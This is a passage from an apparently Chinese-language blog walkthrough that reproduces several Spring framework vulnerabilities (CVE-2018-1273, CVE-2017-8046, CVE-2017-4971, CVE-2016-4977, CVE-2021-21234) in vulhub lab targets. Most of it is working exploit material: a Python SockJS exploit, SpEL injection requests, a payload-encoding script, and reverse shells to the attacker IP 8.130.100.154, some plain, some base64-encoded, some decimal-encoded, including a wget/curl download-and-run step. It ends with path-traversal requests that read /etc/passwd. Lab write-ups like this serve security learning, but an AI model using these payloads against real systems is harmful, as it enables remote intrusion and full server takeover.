logging<span class="token punctuation">.</span>basicConfig<span class="token punctuation">(</span>stream<span class="token operator">=</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">,</span> level<span class="token operator">=</span>logging<span class="token punctuation">.</span>INFO<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">random_str</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">:</span>
    letters <span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_lowercase <span class="token operator">+</span> string<span class="token punctuation">.</span>digits
    <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>letters<span class="token punctuation">)</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token keyword">class</span> <span class="token class-name">SockJS</span><span class="token punctuation">(</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> url<span class="token punctuation">,</span> <span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token builtin">super</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>base <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>url<span class="token punctuation">&#125;</span></span><span class="token string">/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>random_str<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span>
        self<span class="token punctuation">.</span>daemon <span class="token operator">=</span> <span class="token boolean">True</span>
        self<span class="token punctuation">.</span>session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>session<span class="token punctuation">.</span>headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
            <span class="token string">'Referer'</span><span class="token punctuation">:</span> url<span class="token punctuation">,</span>
            <span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)'</span>
        <span class="token punctuation">&#125;</span>
        self<span class="token punctuation">.</span>t <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">1000</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        url <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>self<span class="token punctuation">.</span>base<span class="token punctuation">&#125;</span></span><span class="token string">/htmlfile?c=_jp.vulhub'</span></span>
        response <span class="token operator">=</span> self<span class="token punctuation">.</span>session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> stream<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
        <span class="token keyword">for</span> line <span class="token keyword">in</span> response<span class="token punctuation">.</span>iter_lines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.5</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">send</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> command<span class="token punctuation">,</span> headers<span class="token punctuation">,</span> body<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        data <span class="token operator">=</span> <span class="token punctuation">[</span>command<span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'\n'</span><span class="token punctuation">]</span>

        data<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>k<span class="token punctuation">&#125;</span></span><span class="token string">:</span><span class="token interpolation"><span class="token punctuation">&#123;</span>v<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span> <span class="token keyword">for</span> k<span class="token punctuation">,</span> v <span class="token keyword">in</span> headers<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

        data<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'\n\n'</span><span class="token punctuation">)</span>
        data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>body<span class="token punctuation">)</span>
        data<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'\x00'</span><span class="token punctuation">)</span>
        data <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

        response <span class="token operator">=</span> self<span class="token punctuation">.</span>session<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>self<span class="token punctuation">.</span>base<span class="token punctuation">&#125;</span></span><span class="token string">/xhr_send?t=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>self<span class="token punctuation">.</span>t<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>
        <span class="token keyword">if</span> response<span class="token punctuation">.</span>status_code <span class="token operator">!=</span> <span class="token number">204</span><span class="token punctuation">:</span>
            logging<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"send '</span><span class="token interpolation"><span class="token punctuation">&#123;</span>command<span class="token punctuation">&#125;</span></span><span class="token string">' data error."</span></span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            logging<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"send '</span><span class="token interpolation"><span class="token punctuation">&#123;</span>command<span class="token punctuation">&#125;</span></span><span class="token string">' data success."</span></span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">__del__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>session<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>


sockjs <span class="token operator">=</span> SockJS<span class="token punctuation">(</span><span class="token string">'http://8.130.100.154:8080/gs-guide-websocket'</span><span class="token punctuation">)</span>
sockjs<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>
time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

sockjs<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'connect'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
    <span class="token string">'accept-version'</span><span class="token punctuation">:</span> <span class="token string">'1.1,1.0'</span><span class="token punctuation">,</span>
    <span class="token string">'heart-beat'</span><span class="token punctuation">:</span> <span class="token string">'10000,10000'</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
sockjs<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'subscribe'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
    <span class="token string">'selector'</span><span class="token punctuation">:</span> <span class="token string">'T(java.lang.Runtime).getRuntime().exec(new String[]&#123;"/bin/bash","-c",'</span>
                <span class="token string">'"exec 5&lt;>/dev/tcp/8.130.100.154/80;cat &lt;&amp;5 | while read line; do $line 2>&amp;5 >&amp;5; done"&#125;)'</span><span class="token punctuation">,</span>
    <span class="token string">'id'</span><span class="token punctuation">:</span> <span class="token string">'sub-0'</span><span class="token punctuation">,</span>
    <span class="token string">'destination'</span><span class="token punctuation">:</span> <span class="token string">'/topic/greetings'</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>

data <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token string">'vulhub'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
sockjs<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'send'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
    <span class="token string">'content-length'</span><span class="token punctuation">:</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token string">'destination'</span><span class="token punctuation">:</span> <span class="token string">'/app/hello'</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="https://img-blog.csdnimg.cn/3e294a607bba440aad29c99b3bcb6db7.png" alt="789"></p>
<h2 id="Spring-Data-RCE-CVE-2018-1273"><a href="#Spring-Data-RCE-CVE-2018-1273" class="headerlink" title="Spring Data RCE(CVE-2018-1273)"></a>Spring Data RCE(CVE-2018-1273)</h2><p>影响范围如⬇️：Spring Data Commons 1.13 - 1.13.10 (Ingalls SR10) Spring Data REST 2.6 - 2.6.10 (Ingalls SR10) Spring Data Commons 2.0 to 2.0.5 (Kay SR5) Spring Data REST 3.0 - 3.0.5 (Kay SR5)</p>
<h3 id="漏洞指纹-1"><a href="#漏洞指纹-1" class="headerlink" title="漏洞指纹"></a>漏洞指纹</h3><p>不是很明显，可能存在spring框架和数据库交互的地方（例如表单）</p>
<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>主页面没有啥<br>使用目录扫描工具扫描到目录&#x2F;users，访问看看<br><img src="https://img-blog.csdnimg.cn/f0b8c2b4f54a4554a13d6966b1ba36d9.png" alt="132"><br>随便输入一点抓包<br><img src="https://img-blog.csdnimg.cn/b685efc72dc44c59a87a702f1d347a5f.png" alt="123"></p>
<p>改一下<br>使用dnslog测试一下</p>
<p>POST:</p>
<pre class="line-numbers language-none"><code class="language-none">POST &#x2F;users?page&#x3D;&amp;size&#x3D;5 HTTP&#x2F;1.1
Host: 8.130.100.1xx:8080
Content-Length: 127
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;119.0.0.0 Safari&#x2F;537.36
Origin: http:&#x2F;&#x2F;8.130.100.154:8080
Content-Type: application&#x2F;x-www-form-urlencoded
Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.7
Referer: http:&#x2F;&#x2F;8.130.100.154:8080&#x2F;users?page&#x3D;&amp;size&#x3D;5
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8
Cookie: gosession&#x3D;MTY5OTg3OTkyMHxEWDhFQVFMX2dBQUJFQUVRQUFCQV80QUFBUVp6ZEhKcGJtY01CQUFDYVdRR2MzUnlhVzVuRENZQUpEUTFOR00zTmpJMUxUVTROalF0TkdFd1pDMWhOams0TFRRMVptRXhNakEwTjJSa1lRPT18PRHNBt47aG28oC6jqqZpQ79n0DnHBAy1NITTlRpY&#x3D;
Connection: close

username[#this.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;ping 9r6b8g.dnslog.cn&quot;)]&#x3D;&amp;password&#x3D;&amp;repeatedPassword&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="https://img-blog.csdnimg.cn/1b476068d34b4973863ff9419cabccd7.png" alt="123"><br>那么就开始反弹一个shell<br><code>username[#this.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC84LjEzMC4xMDAuMTU0LzgwIDA+JjE=&#125;|&#123;base64 -d&#125;|&#123;bash -i&#125;&quot;)]=&amp;password=&amp;repeatedPassword=</code></p>
<p>发现不成功，也不知道哪里出了问题<br>看下一种方法：</p>
<p>在自己的服务器上放一个shell脚本。然后开启http服务让受害者去访问这个地址。<br>服务器：<br>1、建立一个shell脚本</p>
<blockquote>
<p>exp.sh<br><code>bash -i &gt;&amp; /dev/tcp/8.130.xxx.1x4/80 0&gt;&amp;1</code></p>
</blockquote>
<p>2、开启HTTP服务</p>
<blockquote>
<p><code>python -m http.server</code><br><img src="https://img-blog.csdnimg.cn/ad824264849544c483b4c50ca6c36610.png" alt="465"></p>
</blockquote>
<p>3（可省略）、然后让靶机下载该文件到&#x2F;tmp目录下。（其他目录下可能要赋予权限，比较麻烦）</p>
<blockquote>
<p><code>wget http://x.x.xx.x/exp.sh</code><br><img src="https://img-blog.csdnimg.cn/fcc99b3be0934b59937aa6c5fa885b8a.png" alt="123"></p>
</blockquote>
<p>4、靶机使用curl命令将exp.sh写到&#x2F;tmp目录下。</p>
<blockquote>
<p><code>curl -o /tmp/exp.sh http://8.xxx.xxx.xx4:8000/exp.sh</code><br><img src="https://img-blog.csdnimg.cn/332e0dae85b04346996732f9db6661f6.png" alt="132"></p>
</blockquote>
<p>5、然后靶机运行shell文件</p>
<blockquote>
<p>bash &#x2F;tmp&#x2F;exp.sh</p>
</blockquote>
<p>成功连接上<br><img src="https://img-blog.csdnimg.cn/0fcc0411c56049c48b0be98c4c47f1a7.png" alt="123"></p>
<h2 id="Spring-Data-REST-RCE-CVE-2017-8046"><a href="#Spring-Data-REST-RCE-CVE-2017-8046" class="headerlink" title="Spring Data REST RCE(CVE-2017-8046)"></a>Spring Data REST RCE(CVE-2017-8046)</h2><p>影响版本：</p>
<p>Spring Data REST versions &lt; 2.5.12, 2.6.7, 3.0 RC3</p>
<p>Spring Boot version &lt; 2.0.0M4</p>
<p>Spring Data release trains &lt; Kay-RC3</p>
<h3 id="漏洞指纹-2"><a href="#漏洞指纹-2" class="headerlink" title="漏洞指纹"></a>漏洞指纹</h3><p><img src="https://img-blog.csdnimg.cn/9c1a7a21631b4f50ac3c3566cf68edb3.png" alt="132"></p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
  <span class="token property">"_links"</span> <span class="token operator">:</span> <span class="token punctuation">&#123;</span>
    <span class="token property">"customers"</span> <span class="token operator">:</span> <span class="token punctuation">&#123;</span>
      <span class="token property">"href"</span> <span class="token operator">:</span> <span class="token string">"http://x.x.x.x:8080/customers"</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
    <span class="token property">"profile"</span> <span class="token operator">:</span> <span class="token punctuation">&#123;</span>
      <span class="token property">"href"</span> <span class="token operator">:</span> <span class="token string">"http://x.x.x.x:8080/profile"</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>看到json格式的返回值，说明这是一个Restful风格的api服务器<br>指纹就是网页全是json,里面有一些类</p>
<h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>访问&#x2F;customers&#x2F;1，符合漏洞指纹。<br><img src="https://img-blog.csdnimg.cn/31fee77b694e446b94dc0b35ec794cad.png" alt="465"></p>
<p>PATCH的值是SpEL表达式，添加请求头为Content-Type：application&#x2F;json-patch+json ，而且命令需要改为10进制编码。</p>
<pre class="line-numbers language-text" data-language="text"><code class="language-text">PATCH /customers/1 HTTP/1.1
Host: 8.130.100.154:8080
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: gosession=MTY5OTg3OTkyMHxEWDhFQVFMX2dBQUJFQUVRQUFCQV80QUFBUVp6ZEhKcGJtY01CQUFDYVdRR2MzUnlhVzVuRENZQUpEUTFOR00zTmpJMUxUVTROalF0TkdFd1pDMWhOams0TFRRMVptRXhNakEwTjJSa1lRPT18P_GIRHNBt47aG28oC6jqqZpQ79n0DnHBAy1NITTlRpY=
If-None-Match: "0"
If-Modified-Since: Tue, 21 Nov 2023 13:09:48 GMT
Content-Type: application/json-patch+json
Connection: close
Content-Length: 468

[
  &#123; "op": "replace", 
    "path": "T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]&#123;98,97,115,104,32,45,99,32,123,101,99,104,111,44,89,109,70,122,97,67,65,116,97,83,65,43,74,105,65,118,90,71,86,50,76,51,82,106,99,67,56,52,76,106,69,122,77,67,52,120,77,68,65,117,77,84,85,48,76,122,103,119,73,68,65,43,74,106,69,61,125,124,123,98,97,115,101,54,52,44,45,100,125,124,123,98,97,115,104,44,45,105,125&#125;))/lastname",
    "value": "exploit" 
  &#125;
]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里的十进制就是<code>bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC84LjEzMC4xMDAuMTU0LzgwIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</code></p>
<p>然后服务器监听端口，靶机这边再使用bp发送上述报文<br><img src="https://img-blog.csdnimg.cn/9aa440ec7c234562b7d533f45b55f0b2.png" alt="123"><br>发现成功反弹shell<br><img src="https://img-blog.csdnimg.cn/c05967577f1b42b98decea4522ce3e43.png" alt="123"></p>
<h2 id="Spring-Web-Flow-RCE-CVE-2017-4971"><a href="#Spring-Web-Flow-RCE-CVE-2017-4971" class="headerlink" title="Spring Web Flow RCE(CVE-2017-4971)"></a>Spring Web Flow RCE(CVE-2017-4971)</h2><p>影响范围<br>Spring Web Flow 2.4.0 - 2.4.4<br>详细漏洞分析<a href="https://paper.seebug.org/322/">Spring Web Flow 远程代码执行漏洞分析(CVE-2017-4971)</a></p>
<h3 id="漏洞指纹-3"><a href="#漏洞指纹-3" class="headerlink" title="漏洞指纹"></a>漏洞指纹</h3><p>无明显漏洞指纹，在各种提交表单的地方可以尝试</p>
<h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><ul>
<li>1、MvcViewFactoryCreator对象的useSpringBeanBinding参数需要设置为false（默认值） </li>
<li>2、flow view 对象中设置BinderConfiguration对象为空</li>
</ul>
<h3 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>随便登录一个账户，账号密码都已经给出<br><img src="https://img-blog.csdnimg.cn/15f73395f6ec4ae187a14ac8bf9cc982.png" alt="12"><br>登录之后随便进入一个房间<br><img src="https://img-blog.csdnimg.cn/b176f94d4f0e4299a75eff0f33298237.png" alt="123"><br>之后点击预定酒店(Book Hotel)<br>然后将信息随便完善一下<br><img src="https://img-blog.csdnimg.cn/4ccc00442da546639f1d0544b9f1a4e6.png" alt="456"><br>点击confirm，此时记得开启抓包，因为这里有csrf的token限制，所以重放是没有用的<br>先使用dnslog测试一下<br><img src="https://img-blog.csdnimg.cn/9d09a54848f540838c24075f2f941181.png" alt="123"><br> <img src="https://img-blog.csdnimg.cn/4670469add45474db6a6f9c04a5f022d.png" alt="123"></p>
<p>反弹shell</p>
<blockquote>
<p><code>_eventId_confirm=&amp;_csrf=eed53409-7b2a-4b0e-b00b-27e6beb51aeb&amp;_(new+java.lang.ProcessBuilder(&quot;bash&quot;,&quot;-c&quot;,&quot;bash+-i+&gt;%26+/dev/tcp/8.130.100.154/80+0&gt;%261&quot;)).start()=vulhub</code><br>（记得这样url编码一下，不然反弹不成功，已经试过了。。。）<br><img src="https://img-blog.csdnimg.cn/14655ebd8e5d42c7b07d0bbd8d4fdfc7.png" alt="123"><br><img src="https://img-blog.csdnimg.cn/e8222bea59ba4ceda7ebd4dfcfbda40a.png" alt="123"></p>
</blockquote>
<h2 id="Spring-Security-OAuth2-RCE-CVE-2016-4977"><a href="#Spring-Security-OAuth2-RCE-CVE-2016-4977" class="headerlink" title="Spring Security OAuth2 RCE(CVE-2016-4977)"></a>Spring Security OAuth2 RCE(CVE-2016-4977)</h2><p>影响范围：<br>Spring Security OAuth 2.0 - 2.0.9<br>Spring Secutiry OAuth 1.0-1.0.5</p>
<h3 id="漏洞指纹-4"><a href="#漏洞指纹-4" class="headerlink" title="漏洞指纹"></a>漏洞指纹</h3><p>访问</p>
<blockquote>
<p>&#x2F;oauth&#x2F;authorize?response_type&#x3D;${2*2}&amp;client_id&#x3D;acme&amp;scope&#x3D;openid&amp;redirect_uri&#x3D;<a href="http://test/">http://test</a></p>
</blockquote>
<p>存在登录页面<br>默认账号密码admin&#x2F;admin<br>然后回显这个画面 <img src="https://img-blog.csdnimg.cn/fabd0d40d6cb4ba5b54f44239db9a84e.png" alt="45"><br>说明就是存在漏洞<br>payload生成脚本</p>
<pre class="line-numbers language-python3" data-language="python3"><code class="language-python3">#!&#x2F;usr&#x2F;bin&#x2F;env python

message &#x3D; input(&#39;Enter message to encode:&#39;)

poc &#x3D; &#39;$&#123;T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)&#39; % ord(message[0])

for ch in message[1:]:
   poc +&#x3D; &#39;.concat(T(java.lang.Character).toString(%s))&#39; % ord(ch) 

poc +&#x3D; &#39;)&#125;&#39;

print(poc)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="https://img-blog.csdnimg.cn/f3f7fc1fe795429caa2737e39ad6afe9.png" alt="123"><br>复制一下结果并且拼接到这里<br><code>oauth/authorize?response_type=$&#123;POC&#125;&amp;client_id=acme&amp;scope=openid&amp;redirect_uri=http://test</code><br>发现无回显 <img src="https://img-blog.csdnimg.cn/fc8d3e0dde30449fb8fcd267f88faadd.png" alt="12"></p>
<p>弹个shell试一试<br><code>bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC84LjEzMC4xMDAuMTU0LzgwIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</code><br><img src="https://img-blog.csdnimg.cn/f7b18d6679974a3191d4e86d142da821.png" alt="123"><br>服务器监听端口</p>
<blockquote>
<p>nc -lvnp 80</p>
</blockquote>
<p>payload</p>
<blockquote>
<p><code>http://8.130.100.154:8080/oauth/authorize?response_type=$&#123;T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(98).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(123)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(44)).concat(T(java.lang.Character).toString(89)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(70)).concat(T(java.lang.Character).toString(122)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(67)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(83)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(43)).concat(T(java.lang.Character).toString(74)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(118)).concat(T(java.lang.Character).toString(90)).concat(T(java.lang.Character).toString(71)).concat(T(java.lang.Character).toString(86)).concat(T(java.lang.Character).toString(50)).concat(T(java.lang.Character).toString(76)).concat(T(java.lang.Character).toString(51)).concat(T(java.lang.Character).toString(82)).concat(T(java.lang.Character).toString(106)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(67)).concat(T(java.lang.Character).toString(56)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(76)).concat(T(java.lang.Character).toString(106)).concat(T(java.lang.Character).toString(69)).concat(T(java.lang.Character).toString(122)).concat(T(java.lang.Character).toString(77)).concat(T(java.lang.Character).toString(67)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(120)).concat(T(java.lang.Character).toString(77)).concat(T(java.lang.Character).toString(68)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(117)).concat(T(java.lang.Character).toString(77)).concat(T(java.lang.Character).toString(84)).concat(T(java.lang.Character).toString(85)).concat(T(java.lang.Character).toString(48)).concat(T(java.lang.Character).toString(76)).concat(T(java.lang.Character).toString(122)).concat(T(java.lang.Character).toString(103)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(73)).concat(T(java.lang.Character).toString(68)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(43)).concat(T(java.lang.Character).toString(74)).concat(T(java.lang.Character).toString(106)).concat(T(java.lang.Character).toString(69)).concat(T(java.lang.Character).toString(61)).concat(T(java.lang.Character).toString(125)).concat(T(java.lang.Character).toString(124)).concat(T(java.lang.Character).toString(123)).concat(T(java.lang.Character).toString(98)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(54)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(44)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(100)).concat(T(java.lang.Character).toString(125)).concat(T(java.lang.Character).toString(124)).concat(T(java.lang.Character).toString(123)).concat(T(java.lang.Character).toString(98)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(44)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(125)))&#125;&amp;client_id=acme&amp;scope=openid&amp;redirect_uri=http://test</code></p>
</blockquote>
<p>反弹成功<br><img src="https://img-blog.csdnimg.cn/2a71fd763f72413d86ed417ce91832a0.png" alt="12"></p>
<h2 id="Spring-Boot-目录遍历-CVE-2021-21234"><a href="#Spring-Boot-目录遍历-CVE-2021-21234" class="headerlink" title="Spring Boot 目录遍历(CVE-2021-21234)"></a>Spring Boot 目录遍历(CVE-2021-21234)</h2><p>漏洞影响范围：spring boot actuator logview &lt; 0.2.13</p>
<h3 id="漏洞指纹-5"><a href="#漏洞指纹-5" class="headerlink" title="漏洞指纹"></a>漏洞指纹</h3><p>首页为ok<br>or首页为Hellow Spring Boot<br><img src="https://img-blog.csdnimg.cn/direct/7a18b3c2c571452289656b6893ec2844.png" alt="132"></p>
<h3 id="漏洞复现-3"><a href="#漏洞复现-3" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><pre class="line-numbers language-text" data-language="text"><code class="language-text">#Windows
&#123;&#123;BaseURL&#125;&#125;/manage/log/view?filename=/windows/win.ini&amp;base=../../../../../../../../../../

#Windows
&#123;&#123;BaseURL&#125;&#125;/log/view?filename=/windows/win.ini&amp;base=../../../../../../../../../../

#Linux
&#123;&#123;BaseURL&#125;&#125;/manage/log/view?filename=/etc/passwd&amp;base=../../../../../../../../../../

#Linux
